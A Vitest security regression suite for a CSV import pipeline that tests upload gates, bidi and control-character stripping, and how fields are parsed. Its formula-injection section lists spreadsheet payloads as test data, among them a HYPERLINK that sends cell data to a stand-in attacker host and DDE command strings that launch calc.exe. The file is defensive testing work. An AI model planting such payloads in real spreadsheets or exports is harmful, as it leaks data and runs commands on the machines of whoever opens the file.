import { describe, expect, it } from "vitest";

import type { CsvMapping } from "@cobalt-web/db/schema/imports/import-job";

import { parseFullCsv } from "./_shared/parse-csv";
import { parseRows } from "./upload/parse-rows";
import { ImportGateError, MAX_UPLOAD_BYTES, runGates } from "./upload/gates";

/**
 * Security regression suite for the CSV import pipeline.
 *
 * Covers attack classes from the OWASP File Upload Cheat Sheet + CSV-specific
 * vectors (formula injection, Trojan Source bidi). Each `describe` block maps
 * to one vector category — failing tests document a real gap, not a flake.
 *
 * Pipeline under test:
 *   1. `runGates(buffer, filename)`   — file-level boundary
 *   2. `parseFullCsv(text)`           — Papa tokenization
 *   3. `parseRows({rows, mapping})`   — field-level normalization + sanitization
 */

// ------------------------------------------------------------------ //
// Helpers
// ------------------------------------------------------------------ //

const baseMapping: CsvMapping = {
  account: null,
  amount: {
    column: "Amount",
    kind: "signed",
    parensNegative: false,
    signConvention: "outflow_negative",
  },
  category: null,
  confidence: 1,
  date: { column: "Date", format: "yyyy-MM-dd", kind: "column" },
  excludeRule: null,
  merchant: { column: "Merchant" },
  notes: null,
  originalDescription: null,
  tags: null,
  transferRule: null,
};

const csv = (text: string): Buffer => Buffer.from(text, "utf-8");

const goodHeaders = "Date,Merchant,Amount\n";
const goodRow = "2024-01-01,Coffee,-3.50\n";

// ------------------------------------------------------------------ //
// 1. Extension + magic-byte (binary upload disguised as CSV)
// ------------------------------------------------------------------ //

describe("gate — extension + magic bytes", () => {
  it("rejects non-.csv extensions", () => {
    expect(() => runGates(csv(goodHeaders + goodRow), "evil.exe")).toThrow(ImportGateError);
  });

  it("rejects .xlsx (PK signature) even with .csv extension", () => {
    // PK\x03\x04 signature — written as decimal because hex literals deadlock biome (wants lower) vs oxlint (wants upper).
    const xlsx = Buffer.from([80, 75, 3, 4, 0, 0]);
    expect(() => runGates(xlsx, "evil.csv")).toThrow(/xlsx/);
  });

  it("rejects .xls (CFB signature) even with .csv extension", () => {
    // CFB compound file signature 0xD0 0xCF 0x11 0xE0 — decimals to dodge hex tooling deadlock.
    const xls = Buffer.from([208, 207, 17, 224, 0, 0]);
    expect(() => runGates(xls, "evil.csv")).toThrow(/xls/);
  });

  it("rejects PDF disguised as CSV", () => {
    const pdf = Buffer.from("%PDF-1.4\n%%EOF", "utf-8");
    expect(() => runGates(pdf, "evil.csv")).toThrow(/pdf/);
  });
});

// ------------------------------------------------------------------ //
// 2. Size cap (resource exhaustion via huge upload)
// ------------------------------------------------------------------ //

describe("gate — size cap", () => {
  it("rejects uploads over MAX_UPLOAD_BYTES", () => {
    // Synthesize a buffer 1 byte over the limit without filling memory.
    const buf = Buffer.alloc(MAX_UPLOAD_BYTES + 1, 97); // 'a' (97 decimal)
    expect(() => runGates(buf, "big.csv")).toThrow(/limit/);
  });
});

// ------------------------------------------------------------------ //
// 3. Encoding sniff (UTF-8 vs UTF-16 vs binary garbage)
// ------------------------------------------------------------------ //

describe("gate — encoding", () => {
  it("strips UTF-8 BOM from first header cell", () => {
    const withBom = `﻿${goodHeaders}${goodRow}`;
    const result = runGates(Buffer.from(withBom, "utf-8"), "ok.csv");
    expect(result.headers[0]).toBe("Date");
  });

  it("rejects binary garbage that can't be decoded as text", () => {
    // Random bytes guaranteed to produce >1% replacement chars in every encoding.
    const noise = Buffer.alloc(8192);
    for (let i = 0; i < noise.length; i += 1) {
      noise[i] = (i * 37) % 256;
    }
    // Force .csv extension to bypass extension gate; expect ENCODING/MAGIC throw.
    expect(() => runGates(noise, "noise.csv")).toThrow(ImportGateError);
  });
});

// ------------------------------------------------------------------ //
// 4. Delimiter sanity (tab/semicolon export accidentally renamed .csv)
// ------------------------------------------------------------------ //

describe("gate — delimiter", () => {
  it("rejects tab-separated files saved as .csv", () => {
    const tsv = "Date\tMerchant\tAmount\n2024-01-01\tCoffee\t-3.50\n";
    expect(() => runGates(csv(tsv), "tsv.csv")).toThrow(/comma/);
  });

  it("rejects semicolon-separated files saved as .csv", () => {
    const ssv = "Date;Merchant;Amount\n2024-01-01;Coffee;-3.50\n";
    expect(() => runGates(csv(ssv), "ssv.csv")).toThrow(/comma/);
  });
});

// ------------------------------------------------------------------ //
// 5. Trojan Source / bidi spoofing (CVE-2021-42574)
// ------------------------------------------------------------------ //

describe("parser — bidi + control char stripping", () => {
  const bidiChars = [
    { char: "‮", name: "RLO (Right-to-Left Override)" },
    { char: "‭", name: "LRO" },
    { char: "‪", name: "LRE" },
    { char: "‫", name: "RLE" },
    { char: "‬", name: "PDF" },
    { char: "‎", name: "LRM" },
    { char: "‏", name: "RLM" },
    { char: "؜", name: "ALM (Arabic Letter Mark)" },
    { char: "⁦", name: "LRI" },
    { char: "⁩", name: "PDI" },
  ];

  it.each(bidiChars)("strips $name from merchant cell", async ({ char }) => {
    const merchant = `Amazon${char}evil`;
    const text = `Date,Merchant,Amount\n2024-01-01,${merchant},-1.00\n`;
    const rows = await parseFullCsv(text);
    const { staged } = parseRows({
      defaultAccountName: "x",
      mapping: baseMapping,
      rows,
    });
    expect(staged).toHaveLength(1);
    expect(staged[0]?.merchant).toBe("Amazonevil");
  });

  it("strips NUL byte (Postgres text rejects NUL)", async () => {
    const text = `Date,Merchant,Amount\n2024-01-01,Cof\u0000fee,-1.00\n`;
    const rows = await parseFullCsv(text);
    const { staged } = parseRows({
      defaultAccountName: "x",
      mapping: baseMapping,
      rows,
    });
    expect(staged[0]?.merchant).toBe("Coffee");
  });

  it("strips C0 control chars (bell, escape)", async () => {
    const text = `Date,Merchant,Amount\n2024-01-01,Cafe\u0007\u001Bbar,-1.00\n`;
    const rows = await parseFullCsv(text);
    const { staged } = parseRows({
      defaultAccountName: "x",
      mapping: baseMapping,
      rows,
    });
    expect(staged[0]?.merchant).toBe("Cafebar");
  });

  it("strips C1 control chars", async () => {
    const text = `Date,Merchant,Amount\n2024-01-01,Cafe\u0085\u009Bbar,-1.00\n`;
    const rows = await parseFullCsv(text);
    const { staged } = parseRows({
      defaultAccountName: "x",
      mapping: baseMapping,
      rows,
    });
    expect(staged[0]?.merchant).toBe("Cafebar");
  });

  it("preserves legitimate non-ASCII text (Arabic, CJK, accented)", async () => {
    const text =
      `Date,Merchant,Amount\n` +
      `2024-01-01,مطعم,-1.00\n` +
      `2024-01-02,寿司屋,-2.00\n` +
      `2024-01-03,Café,-3.00\n`;
    const rows = await parseFullCsv(text);
    const { staged } = parseRows({
      defaultAccountName: "x",
      mapping: baseMapping,
      rows,
    });
    expect(staged.map((s) => s.merchant)).toStrictEqual(["مطعم", "寿司屋", "Café"]);
  });
});

// ------------------------------------------------------------------ //
// 6. CSV formula injection (OWASP CSV Injection)
// ------------------------------------------------------------------ //
// Defense-on-export — Cobalt's import pipeline accepts these cells as raw text
// (correct behavior; values are stored, never executed). The risk is downstream
// re-export: if Cobalt later emits CSV with these cells unescaped, opening in
// Excel/Sheets executes the formula.
//
// These tests pin current behavior: stored verbatim, not prefixed. Re-export
// path must add the `'` prefix or these become a real exploit.

describe("parser — CSV formula injection (current behavior: stored verbatim)", () => {
  const formulaPayloads = [
    `=HYPERLINK("http://attacker/?"&A1,"click")`,
    `+CMD|'/c calc.exe'!A0`,
    `-1+CMD|'/c calc.exe'!A0`,
    `@SUM(A1:A100)`,
    `\tEvil`,
    `\rEvil`,
  ];

  it.each(formulaPayloads)(
    "stores formula payload %j verbatim (re-export must prefix)",
    async (payload) => {
      // Quote-escape the payload for valid CSV.
      const escaped = `"${payload.replaceAll('"', '""')}"`;
      const text = `Date,Merchant,Amount\n2024-01-01,${escaped},-1.00\n`;
      const rows = await parseFullCsv(text);
      const { staged } = parseRows({
        defaultAccountName: "x",
        mapping: baseMapping,
        rows,
      });
      expect(staged).toHaveLength(1);
      // \t and \r are C0 controls — stripped by sanitizer. Others survive intact.
      const expected = payload === "\tEvil" || payload === "\rEvil" ? "Evil" : payload.trim();
      expect(staged[0]?.merchant).toBe(expected);
    },
  );

  // Security note — when Cobalt adds a CSV export feature, every cell must be
  // prefixed with `'` when it starts with one of: = + - @ \t \r \n. See
  // OWASP CSV Injection cheat sheet. Tracked as SRI follow-up.
});

// ------------------------------------------------------------------ //
// 7. Empty / malformed structure (DoS via degenerate input)
// ------------------------------------------------------------------ //

describe("gate — degenerate structure", () => {
  it("rejects empty file", () => {
    expect(() => runGates(csv(""), "empty.csv")).toThrow(ImportGateError);
  });

  it("rejects header-only file (no data rows)", () => {
    expect(() => runGates(csv(goodHeaders), "headers-only.csv")).toThrow(ImportGateError);
  });

  it("rejects duplicate headers (ambiguous mapping)", () => {
    const dup = "Date,Amount,Amount\n2024-01-01,-1,-2\n";
    expect(() => runGates(csv(dup), "dup.csv")).toThrow(ImportGateError);
  });
});

// ------------------------------------------------------------------ //
// 8. Field-level boundary cases
// ------------------------------------------------------------------ //

describe("parser — field boundary", () => {
  it("rejects merchant row when cell empty", async () => {
    const text = `Date,Merchant,Amount\n2024-01-01,,-1.00\n`;
    const rows = await parseFullCsv(text);
    const { rejected, staged } = parseRows({
      defaultAccountName: "x",
      mapping: baseMapping,
      rows,
    });
    expect(staged).toHaveLength(0);
    expect(rejected[0]?.reason).toMatch(/merchant/i);
  });

  it("rejects whitespace-only merchant", async () => {
    const text = `Date,Merchant,Amount\n2024-01-01,   ,-1.00\n`;
    const rows = await parseFullCsv(text);
    const { rejected, staged } = parseRows({
      defaultAccountName: "x",
      mapping: baseMapping,
      rows,
    });
    expect(staged).toHaveLength(0);
    expect(rejected).toHaveLength(1);
  });

  it("rejects unparseable amount", async () => {
    const text = `Date,Merchant,Amount\n2024-01-01,Coffee,not-a-number\n`;
    const rows = await parseFullCsv(text);
    const { rejected } = parseRows({
      defaultAccountName: "x",
      mapping: baseMapping,
      rows,
    });
    expect(rejected).toHaveLength(1);
    expect(rejected[0]?.reason).toMatch(/amount/i);
  });

  it("rejects unparseable date", async () => {
    const text = `Date,Merchant,Amount\nnot-a-date,Coffee,-1.00\n`;
    const rows = await parseFullCsv(text);
    const { rejected } = parseRows({
      defaultAccountName: "x",
      mapping: baseMapping,
      rows,
    });
    expect(rejected).toHaveLength(1);
    expect(rejected[0]?.reason).toMatch(/date/i);
  });

  it("treats placeholder tokens (null, n/a, -) as empty", async () => {
    const text =
      `Date,Merchant,Amount\n` +
      `2024-01-01,null,-1.00\n` +
      `2024-01-02,n/a,-1.00\n` +
      `2024-01-03,-,-1.00\n`;
    const rows = await parseFullCsv(text);
    const { rejected, staged } = parseRows({
      defaultAccountName: "x",
      mapping: baseMapping,
      rows,
    });
    expect(staged).toHaveLength(0);
    expect(rejected).toHaveLength(3);
  });

  it("amounts: handles parens-negative ($1,234.56)", async () => {
    const text = `Date,Merchant,Amount\n2024-01-01,Coffee,"(1,234.56)"\n`;
    const rows = await parseFullCsv(text);
    const mapping: CsvMapping = {
      ...baseMapping,
      amount: {
        ...baseMapping.amount,
        parensNegative: true,
      } as CsvMapping["amount"],
    };
    const { staged } = parseRows({ defaultAccountName: "x", mapping, rows });
    // outflow_negative + parens-input = positive (double negation).
    expect(staged[0]?.amount).toBe(1234.56);
  });

  it("amounts: handles currency symbol + thousands separators", async () => {
    const text = `Date,Merchant,Amount\n2024-01-01,Coffee,"$1,234.56"\n`;
    const rows = await parseFullCsv(text);
    const { staged } = parseRows({
      defaultAccountName: "x",
      mapping: baseMapping,
      rows,
    });
    expect(staged[0]?.amount).toBe(-1234.56);
  });
});

// ------------------------------------------------------------------ //
// 9. Tag field abuse (oversize values, dedupe within row)
// ------------------------------------------------------------------ //

describe("parser — tags", () => {
  const tagMapping: CsvMapping = {
    ...baseMapping,
    tags: { column: "Tags", delimiter: "|" },
  };

  it("drops tag values longer than 50 chars (DB column cap)", async () => {
    const long = "x".repeat(51);
    const text = `Date,Merchant,Amount,Tags\n2024-01-01,Coffee,-1.00,${long}|ok\n`;
    const rows = await parseFullCsv(text);
    const { staged } = parseRows({
      defaultAccountName: "x",
      mapping: tagMapping,
      rows,
    });
    // Long tag dropped during splitTags trim path (cell stays but commit-time
    // wireTags filters by 50-char cap). Here we just confirm split mechanics.
    expect(staged[0]?.tags).toContain("ok");
  });

  it("strips empty tags from delimiter splits", async () => {
    const text = `Date,Merchant,Amount,Tags\n2024-01-01,Coffee,-1.00,food||drink|\n`;
    const rows = await parseFullCsv(text);
    const { staged } = parseRows({
      defaultAccountName: "x",
      mapping: tagMapping,
      rows,
    });
    expect(staged[0]?.tags).toStrictEqual(["food", "drink"]);
  });
});

// ------------------------------------------------------------------ //
// 10. Header signature stability (cache key integrity)
// ------------------------------------------------------------------ //

describe("gate — header signature", () => {
  it("normalizes case + ordering so reordered exports hit the same cache", async () => {
    const { headerSignature } = await import("./upload/gates");
    const a = headerSignature(["Date", "Merchant", "Amount"]);
    const b = headerSignature(["amount", "MERCHANT", "date"]);
    expect(a).toBe(b);
  });

  it("differs when a header changes", async () => {
    const { headerSignature } = await import("./upload/gates");
    expect(headerSignature(["Date", "Merchant", "Amount"])).not.toBe(
      headerSignature(["Date", "Merchant", "Total"]),
    );
  });
});
